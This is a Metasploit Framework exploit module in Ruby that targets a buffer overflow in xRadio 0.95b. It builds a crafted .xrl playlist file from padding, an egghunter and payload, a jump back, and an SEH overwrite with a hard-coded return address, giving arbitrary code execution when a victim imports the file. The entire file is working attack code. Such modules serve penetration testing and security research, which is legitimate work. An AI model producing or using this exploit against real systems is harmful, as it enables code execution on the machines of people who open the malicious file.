##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'xRadio 0.95b Buffer Overflow',
			'Description'     => %q{
				This module exploits a buffer overflow in xRadio 0.95b.
				Using the application to import a specially crafted xrl file,
				a buffer overflow occurs allowing arbitrary code execution.
			},
			'License'         => MSF_LICENSE,
			'Author'          =>
				[
					'b0telh0 <me[at]gotgeek.com.br>',
				],
			'References'      =>
				[
					[ 'BID', '46290' ],
					[ 'EDB', '16141' ]
				],
			'DefaultOptions'  =>
				{
					'EXITFUNC' => 'seh',
					'DisablePayloadHandler' => 'true'
				},
			'Platform'        => 'win',
			'Payload'         =>
				{
					'Space' => 1000,
					'BadChars' => "\x00\x0a\x0d",
					'StackAdjustment' => -3500
				},
			'Targets'         =>
				[
					[ 'Windows Universal',
						{
							# pop eax - pop ebx - ret xradio.exe
							'Ret' => 0x0047E282
						}
					],
				],
			'Privileged'      => false,
			'DisclosureDate'  => 'Feb 08 2011',
			'DefaultTarget'   => 0))

		register_options(
			[
				OptString.new('FILENAME', [true, 'The file name.', 'msf.xrl'])
			], self.class)

	end

	def exploit
		eggoptions =
		{
			:checksum => true,
			:eggtag => 'w00t'
		}

		hunter,egg = generate_egghunter(payload.encoded, eggoptions)

		buffer =  rand_text_alpha_upper(4066-egg.length)
		buffer << egg
		buffer << make_nops(10)
		buffer << hunter
		buffer << "\xeb\xd8\xff\xff"      # nseh  jmp back 40 bytes
		buffer << [target.ret].pack('V')  # seh

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(buffer)
	end

end